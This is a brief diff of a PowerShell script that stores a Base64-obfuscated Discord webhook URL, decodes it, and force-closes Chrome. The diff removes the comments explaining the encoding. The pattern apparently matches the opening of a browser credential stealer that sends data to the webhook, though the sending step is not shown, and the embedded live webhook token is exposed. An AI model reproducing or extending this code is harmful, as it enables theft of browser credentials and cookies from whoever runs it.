@@ -1,9 +1,7 @@
 $ErrorActionPreference = 'Continue'
 
-# Base64-encoded Discord webhook URL
 $encodedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI5Mjc2MTE2MjA4MDk3NjkyNi93M2s2U2p0QW1VVWdLY2t1VXJBUVduR2lVNEp5bF8weGtRZVBGYmtuc0Z4bU5NLW51R0p3OTRtajA3NWhkcmVLcTVoVw=="
 
-# Decode the webhook URL from Base64
 $webhookUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedWebhook))
 
 try { Stop-Process -Name "chrome" } catch {}
